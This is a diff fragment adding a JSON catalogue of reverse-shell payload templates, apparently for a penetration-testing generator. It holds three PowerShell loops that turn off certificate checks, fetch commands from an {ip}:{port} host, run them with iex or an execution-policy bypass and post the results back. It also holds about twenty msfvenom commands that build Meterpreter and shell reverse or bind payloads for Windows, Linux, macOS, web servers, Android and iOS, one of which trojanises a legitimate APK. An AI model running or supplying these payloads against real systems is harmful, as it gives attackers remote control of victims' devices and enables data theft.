+      "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/11e6bc4b -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/fefb1eab -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/68a9612e -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell Outfile https",
+      "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+      "meta": [
+        "windows"
+      ]
+    },
+    {
+      "name": "PowerShell Outfile Constr Lang Mode https",
+      "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+      "meta": [
+        "windows"
+      ]
+    }
+  ],
+  "msf": [
+    {
+      "name": "Windows Meterpreter Staged Reverse TCP (x64)",
+      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "staged",
+        "meterpreter",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Windows Meterpreter Stageless Reverse TCP (x64)",
+      "command": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Windows Staged Reverse TCP (x64)",
+      "command": "msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "staged",
+        "meterpreter",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Windows Stageless Reverse TCP (x64)",
+      "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Windows Staged JSP Reverse TCP",
+      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "staged",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Windows Staged ASPX Reverse TCP",
+      "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "staged",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Windows Staged ASPX Reverse TCP (x64)",
+      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "staged",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Linux Meterpreter Staged Reverse TCP (x64)",
+      "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
+      "meta": [
+        "msfvenom",
+        "linux",
+        "meterpreter",
+        "staged",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Linux Stageless Reverse TCP (x64)",
+      "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
+      "meta": [
+        "msfvenom",
+        "linux",
+        "meterpreter",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Windows Bind TCP ShellCode - BOF",
+      "command": "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\\x00' -f python -v notBuf -o shellcode",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "bind",
+        "bufferoverflow"
+      ]
+    },
+    {
+      "name": "macOS Meterpreter Staged Reverse TCP (x64)",
+      "command": "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
+      "meta": [
+        "msfvenom",
+        "mac",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "macOS Meterpreter Stageless Reverse TCP (x64)",
+      "command": "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
+      "meta": [
+        "msfvenom",
+        "mac",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "macOS Stageless Reverse TCP (x64)",
+      "command": "msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
+      "meta": [
+        "msfvenom",
+        "mac",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "PHP Meterpreter Stageless Reverse TCP",
+      "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "linux",
+        "meterpreter",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "PHP Reverse PHP",
+      "command": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "linux",
+        "meterpreter",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "JSP Stageless Reverse TCP",
+      "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "linux",
+        "meterpreter",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "WAR Stageless Reverse TCP",
+      "command": "msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "linux",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Android Meterpreter Reverse TCP",
+      "command": "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
+      "meta": [
+        "msfvenom",
+        "android",
+        "android",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Android Meterpreter Embed Reverse TCP",
+      "command": "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
+      "meta": [
+        "msfvenom",
+        "android",
+        "android",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Apple iOS Meterpreter Reverse TCP Inline",
+      "command": "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",
+      "meta": [
+        "msfvenom",
+        "apple_ios",
+        "apple_ios",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Python Stageless Reverse TCP",
+      "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
+      "meta": [
+        "msfvenom",
+        "windows",
+        "linux",
+        "stageless",
+        "reverse"
+      ]
+    },
+    {
+      "name": "Bash Stageless Reverse TCP",
+      "command": "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",
+      "meta": [
+        "msfvenom",
+        "linux",
+        "macos",
+        "stageless",
+        "reverse"
+      ]
+    }
+  ]
+}
